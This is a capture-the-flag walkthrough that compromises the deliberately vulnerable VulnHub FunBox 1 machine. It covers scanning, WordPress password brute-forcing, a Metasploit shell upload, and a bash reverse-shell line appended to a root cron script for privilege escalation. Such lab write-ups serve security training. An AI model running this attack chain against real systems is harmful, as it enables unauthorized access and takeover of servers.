# FunBox 1 - Vulnhub

[Vulnhub Link](https://www.vulnhub.com/entry/funbox-1,518/)

## Step 0 - Pre-requisite

Begin by downloading the [FunBox.ova](https://download.vulnhub.com/funbox/FunBox.ova) file to kickstart the installation process.

Next, launch Oracle VM VirtualBox and navigate to File > Import Appliance.
![Import Appliance](https://github.com/omarMahmood05/FunBox-1-Pentesting/assets/86721437/df98cf82-b1be-4b90-867c-cc8e8674449f)


Locate and select the downloaded ova file to proceed.

![File Select](https://github.com/omarMahmood05/FunBox-1-Pentesting/assets/86721437/741eac51-e4fd-4304-af12-b588fd2785df)



Click "Next" and specify the desired installation location for the machine. Confirm by clicking "Finish."
![OVA Intall final](https://github.com/omarMahmood05/FunBox-1-Pentesting/assets/86721437/f7d37db9-71d6-46ae-b202-bc0e71228a8b)


Wait for VM VirtualBox to import the appliance.

Now that the Funbox machine is successfully installed, let's ensure it shares the same network as our Kali Machine.

To achieve this, right-click on the FunBox Machine, navigate to settings, access the network tab, and select the advanced option. Opt for paravirtualized network.

> Note: Repeat the identical process for your Kali Linux Machine to maintain network coherence.


## Step 1 - Reconnaissance

> In recon we are supposed to gather information about the target.

Let's start both the machines (Kali Linux and FunBox)

This is how the Funbox machine should look like once it's booted up 
![funbox image](https://github.com/omarMahmood05/FunBox-1-Pentesting/assets/86721437/3b1b48b2-ce15-4244-b68b-781fc0288f9d)


Now minimize it and let's start Kali Linux

Now that we've booted up on Kali, let's ensure that we're on the same network as the FunBox, and find out the FunBox Machine's IP address.

There are two ways to find the IP of the FunBox machine

 1. Ping Sweep
 2. ARP Scan

The Ping Sweep method is inefficient as it will ping all the possible IPs in the subnet, on the other hand, the ARP scan method will use the ARP protocol to identify all the nodes on the network.

To perform this step we'll use arp-scan

    sudo arp-scan -l

The arp-scan is a command-line tool that uses the ARP protocol to discover and fingerprint IP hosts on the local network. ([arp-scan documentation](https://www.kali.org/tools/arp-scan/))

ARP scan result

![ARP Result](https://github.com/omarMahmood05/FunBox-1-Pentesting/assets/86721437/d1c2db52-578b-46a9-825a-f1956596ecd7)


The "PCS Systemtechnik GmbH" is our FunBox Machine.

## Step 2 - Scanning

Initiate a thorough NMAP scan to assess all open ports on the machine.

    nmap 192.168.0.143 -p- -v -oN funbox-all-port-scan.txt 

Parameters:
-   `-p-`: Encompasses all ports.
-   `-v`: Activates verbose output.
-   `-oN funbox-all-port-scan.txt`: Saves the scan results in a file named "funbox-all-port-scan.txt."

NMAP Results

    PORT      STATE SERVICE
    21/tcp    open  ftp
    22/tcp    open  ssh
    80/tcp    open  http
    33060/tcp open  mysqlx

The open port 80 indicates that there is an HTTP web server. We'll open the webpage in a few seconds but before that let's start a service scan on the open ports so that we can know what is running on each of the ports.

    nmap 192.168.0.143 -sV -A -p21,22,80,33060 -oN funbox-service-scan.txt 

Meanwhile, let's access the webpage. Open Mozilla Firefox and input the machine's IP address into the URL bar.

> A faster way to do this is to open the terminal and type "firefox 192.168.0.143 &" the & will free the terminal by running the process in the background

We should encounter an error that goes something like "Hmm. We’re having trouble finding that site". This happens due to an inability to resolve the domain name through DNS.

To resolve this issue, we'll modify the /etc/hosts file by adding the IP and the corresponding domain. To make these modifications, we'll use the Vim text editor.

To modify the /etc/hosts file we'll use Vim

    sudo vim /etc/hosts

Navigate to the last line and enter the following:

    192.168.0.143	funbox.fritz.box


To save and exit, press the 'Esc' key, then type ":wq".
> Note: You can't type after opening vim? That's because after opening vim you need to enter "insert mode" by pressing i. Now you should be able to modify the file. 

>Note: The space between the IP and the domain is just a single tab. 

> Note: How did we get the domain funbox.fritz.box? When we opened the IP address in Firefox we can see that the domain got resolved to funbox.fritz.box.

To confirm our modifications, let's review the file by using:

    cat /etc/hosts

This output should look something like this 

![etc hosts](https://github.com/omarMahmood05/FunBox-1-Pentesting/assets/86721437/66367ad4-d385-4ed2-9b3f-5dd0af56d09e)


Let's attempt to access the page in Firefox once more.

There we go — we have successfully reached a landing page!
![FunBox Landing Page](https://github.com/omarMahmood05/FunBox-1-Pentesting/assets/86721437/58b61012-10ec-475f-923a-691d6e528943)


Now, let's examine the results of our NMAP service scan.

    PORT      STATE SERVICE VERSION
    21/tcp    open  ftp     ProFTPD
    22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   3072 d2:f6:53:1b:5a:49:7d:74:8d:44:f5:46:e3:93:29:d3 (RSA)
    |   256 a6:83:6f:1b:9c:da:b4:41:8c:29:f4:ef:33:4b:20:e0 (ECDSA)
    |_  256 a6:5b:80:03:50:19:91:66:b6:c3:98:b8:c4:4f:5c:bd (ED25519)
    80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
    |_http-title: Funbox &#8211; Have fun&#8230;.
    |_http-generator: WordPress 5.4.2
    |_http-server-header: Apache/2.4.41 (Ubuntu)
    | http-robots.txt: 1 disallowed entry 
    |_/secret/
    33060/tcp open  mysqlx?
    | fingerprint-strings: 
    |   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
    |     Invalid message"
    |_    HY000

We have a few interesting findings, 
1. The server has ProFTPD
2. The server is running WordPress 5.4.2

Since we know that this webpage is using WordPress let's scan the server using a tool **wpscan**. 

    wpscan --url http://funbox.fritz.box/ -e u,p -o wpscan-funbox.txt

-   `-e`: Enables enumeration.
-   `-u`: Initiates enumeration through User ID ranges (default 1-10).
-   `-p`: Triggers enumeration through popular plugins.
-   `-o wpscan-funbox.txt`: Directs the output to a file named "wpscan-funbox.txt."

Now that the scan has been completed, let's review the results 

    cat wpscan-funbox.txt


Let's go through the findings.

    [+] robots.txt found:
    http://funbox.fritz.box/robots.txt
     | Found By: Robots Txt (Aggressive Detection)
     | Confidence: 100%

Let's examine the contents of the robots.txt file by navigating to the following URL: "[http://funbox.fritz.box/robots.txt](http://funbox.fritz.box/robots.txt)".
![Robots](https://github.com/omarMahmood05/FunBox-1-Pentesting/assets/86721437/da04a2d0-ef4d-4dfd-b51f-2965d8d37bb6)


Let's check the /secret/ path.

![secretsettings](https://github.com/omarMahmood05/FunBox-1-Pentesting/assets/86721437/589bd016-6c0f-4600-b2ba-0eb69101616c)


It seems that /secret/ doesn't reveal any noteworthy information.

Let's continue with our wpscan results...

    [i] User(s) Identified:
    
    [+] admin
     | Found By: Author Posts - Author Pattern (Passive Detection)
     | Confirmed By:
     |  Rss Generator (Passive Detection)
     |  Wp Json Api (Aggressive Detection)
     |   - http://funbox.fritz.box/index.php/wp-json/wp/v2/users/?per_page=100&page=1
     |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
     |  Login Error Messages (Aggressive Detection)
    
    [+] joe
     | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
     | Confirmed By: Login Error Messages (Aggressive Detection)
So we found 2 users.
1. admin
2. joe

Let's try and brute force their passwords using wpscan.

    wpscan --url http://funbox.fritz.box/ -U admin -P /usr/share/wordlists/rockyou.txt

The -U specifies the username and the -P requires a wordlist. We'll use the rockyou.txt

    [!] Valid Combinations Found:
       | Username: admin, Password: iubire

We found the username and the password for the admin!
Let's make a note of it and try the same with joe.

In the meantime let's see how to login into WordPress using the ID and password.
After some Googling, we found this...

> search for your domain name with /wp-admin or /wp-login

Let's try navigating to funbox.fritz.box/wp-admin

![wp login pagesettings](https://github.com/omarMahmood05/FunBox-1-Pentesting/assets/86721437/a4b417ff-e864-4a3a-879b-48f9ebdf1f34)

Let's try the ID and Password

![Email veri](https://github.com/omarMahmood05/FunBox-1-Pentesting/assets/86721437/09b89a04-2d8b-45d6-aa9c-4b4fddf656f1)

> (remind me later)

![wp dashboard](https://github.com/omarMahmood05/FunBox-1-Pentesting/assets/86721437/6b55741c-00d9-49fe-8c4e-cfb15625e5e1)

We're in the WordPress dashboard!

Explore around in the dashboard on your own.

Let's see if we were able to crack the password for the user joe

    [!] Valid Combinations Found:
      | Username: joe, Password: 12345
We got the username and password for joe as well!

## Step 3 - Gaining Access
Now that we have the ID and Password for two users, let's proceed to the next step, Gaining Access.

We'll use Metasploit for the next parts, so let's start Metasploit.
`msfconsole`
![metasploit](https://github.com/omarMahmood05/FunBox-1-Pentesting/assets/86721437/9a1cc641-7057-42ae-b3ff-d2735c9f84bf)
> The image is different every time you launch Metasploit

Let's find a wp_admin exploit... To search for exploits we use 

    search wp_admin

msf6 > search wp_admin

    Matching Modules
    ================
    
       #  Name                                       Disclosure Date  Rank       Check  Description
       -  ----                                       ---------------  ----       -----  -----------
       0  exploit/unix/webapp/wp_admin_shell_upload  2015-02-21       excellent  Yes    WordPress Admin Shell Upload
    
    
    Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/webapp/wp_admin_shell_upload

We'll use the `exploit/unix/webapp/wp_admin_shell_upload` exploit, to use it either type `use 0` (the # number) or `use exploit/unix/webapp/wp_admin_shell_upload`

Now the shell should look something like `msf6 exploit(unix/webapp/wp_admin_shell_upload) > 
`

Let's configure the exploit.
Type options to see the module options that we have to enter.


    Module options (exploit/unix/webapp/wp_admin_shell_upload):
    
       Name       Current Setting  Required  Description
       ----       ---------------  --------  -----------
       PASSWORD                    yes       The WordPress password to authenticate with
       Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
       RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
       RPORT      80               yes       The target port (TCP)
       SSL        false            no        Negotiate SSL/TLS for outgoing connections
       TARGETURI  /                yes       The base path to the wordpress application
       USERNAME                    yes       The WordPress username to authenticate with
       VHOST                       no        HTTP server virtual host

       



Let's enter all the details we know. To enter the options we have to type 
`set optionName optionValue`

Let's configure all the options

    set USERNAME admin
    set RHOSTS funbox.fritz.box
    set PASSWORD iubire
    set LHOST (your linux ip) 
    set LPORT 5555

Now type options to review and verify all the details 

![msf options](https://github.com/omarMahmood05/FunBox-1-Pentesting/assets/86721437/8d9b9436-c674-4876-bd57-adc54c4f6af6)

After reviewing type run and wait.

    [*] Started reverse TCP handler on 192.168.0.190:4444 
    [*] Authenticating with WordPress using admin:iubire...
    [+] Authenticated with WordPress
    [*] Preparing payload...
    [*] Uploading payload...
    [*] Executing the payload at /wp-content/plugins/wDTFFJNVtb/XvXcgataUj.php...
    [*] Sending stage (39927 bytes) to 192.168.0.143
    [+] Deleted XvXcgataUj.php
    [+] Deleted wDTFFJNVtb.php
    [+] Deleted ../wDTFFJNVtb
    [*] Meterpreter session 1 opened (192.168.0.190:4444 -> 192.168.0.143:35504) at 2023-12-21 05:32:48 -0500
    
    meterpreter > 

We have a meterpreter shell, let's get a system shell by typing 
`shell`

Let's try to see if we got a shell, let's run a command `whoami`

    meterpreter > shell
    Process 5091 created.
    Channel 0 created.
    sh: 0: getcwd() failed: No such file or directory
    sh: 0: getcwd() failed: No such file or directory
    whoami
    www-data

Nice, we have a shell, now let's upgrade our shell.

    python -c "import pty; pty.spawn('/bin/bash')"
    
![upgraded shell](https://github.com/omarMahmood05/FunBox-1-Pentesting/assets/86721437/7ece1568-0a8f-45ef-8307-97a633df02de)

Let's explore the machine.

We found two users, "funny" and "joe"

Let's explore "funny"

Using `ls` in `/home/funny` doesn't reveal much so we'll use `ls -lah` 
The `-l` prints out the files and dirs in list
The `-a` prints out hidden files as well
The `-h` prints out in human-readable format

    www-data@funbox:/home/funny$ ls -lah
    ls -lah
    total 47M
    drwxr-xr-x 3 funny funny 4.0K Jul 18  2020 .
    drwxr-xr-x 4 root  root  4.0K Jun 19  2020 ..
    -rwxrwxrwx 1 funny funny   55 Jul 18  2020 .backup.sh
    -rw------- 1 funny funny 1.5K Jul 18  2020 .bash_history
    -rw-r--r-- 1 funny funny  220 Feb 25  2020 .bash_logout
    -rw-r--r-- 1 funny funny 3.7K Feb 25  2020 .bashrc
    drwx------ 2 funny funny 4.0K Jun 19  2020 .cache
    -rw-r--r-- 1 funny funny  807 Feb 25  2020 .profile
    -rw-rw-r-- 1 funny funny  162 Jun 19  2020 .reminder.sh
    -rw-rw-r-- 1 funny funny   74 Jun 19  2020 .selected_editor
    -rw-r--r-- 1 funny funny    0 Jun 19  2020 .sudo_as_admin_successful
    -rw------- 1 funny funny 7.7K Jul 18  2020 .viminfo
    -rw-rw-r-- 1 funny funny  47M Dec 21 10:40 html.tar

Let's read all the files
**.reminder.sh**

    www-data@funbox:/home/funny$ cat .reminder.sh
    cat .reminder.sh
    #!/bin/bash
    echo "Hi Joe, the hidden backup.sh backups the entire webspace on and on. Ted, the new admin, test it in a long run." | mail -s"Reminder" joe@funbox

So we can assume that there is some cron job that executes the `.backup.sh` file.

let's see what the .backup.sh file does.

    www-data@funbox:/home/funny$ cat .backup.sh
    cat .backup.sh
    #!/bin/bash
    tar -cf /home/funny/html.tar /var/www/html

So the script unzips the `html.tar` file to `/var/www/html`

Let's try and see if we can create a reverse shell script and add it to the end of the .backup.sh. We'll use the revshells.com to generate a  reverse shell command.

The Revshells page looks like this

![rev shell](https://github.com/omarMahmood05/FunBox-1-Pentesting/assets/86721437/ac9e99c1-16b4-486a-8270-d8eebfd53127)

In the IP & Port section enter 
IP = Kali Linux IP
Port = 6666

In the OS Section Select `Bash -i`
In the bottom, we have Shell, select `bash` from the dropdown.
And let the Encoding be `None`

The Reverse Shell should look something like this

    bash -i >& /dev/tcp/192.168.0.190/6666 0>&1

Now our next step should be to append this into the .backup.sh file.

To append the `>>` operator is used.
`echo "bash -i >& /dev/tcp/192.168.0.190/6666 0>&1" >> .backup.sh`

Before appending let's start a Netcat listener. Open a new tab on the terminal and type 
`nc -nvlp 6666`

Now we should be listening on port 6666

    listening on [any] 6666 ...

Now let's append the remote shell script into the .backup.sh file
`echo "bash -i >& /dev/tcp/192.168.0.190/6666 0>&1" >> .backup.sh`

Let's review the .backup.sh file

    cat .backup.sh
    #!/bin/bash tar -cf /home/funny/html.tar /var/www/html bash -i >& /dev/tcp/192.168.0.190/6666 0>&1

Our line is appended, now we just have to wait for the root user to run the file from the cron job.

This part may take some time, all you have to do now is wait for the Netcat listener to catch something.

After some time you might get 
`listening on [any] 6666 ...
connect to [192.168.0.190] from (UNKNOWN) [192.168.0.143] 35870
bash: cannot set terminal process group (5343): Inappropriate ioctl for device
bash: no job control in this shell
funny@funbox:~$ 
`

We got the remote access but we got it for the user `funny`. Press `ctrl + c` to stop the Netcat listener and start it again.

This happens because this machine has two cron jobs,
1. Run the `.backup.sh` with the user `funny` every two mins
2. Run the `.backup.sh` with the user `root` every five mins

So if we get the user `funny` just close the nc listener and start it again.

After some time you should get access to the root user. 

`listening on [any] 6666 ...
connect to [192.168.0.190] from (UNKNOWN) [192.168.0.143] 35874
bash: cannot set terminal process group (5374): Inappropriate ioctl for device
bash: no job control in this shell
root@funbox:~# 
`

List out the contents
`ls -lah`

We can see a flag.txt, let's check it out.
`cat flag.txt`

    root@funbox:~# cat flag.txt
    cat flag.txt
    Great ! You did it...
    FUNBOX - made by @0815R2d2

And that's it, you've solved the Vulnhub - Funbox 1.
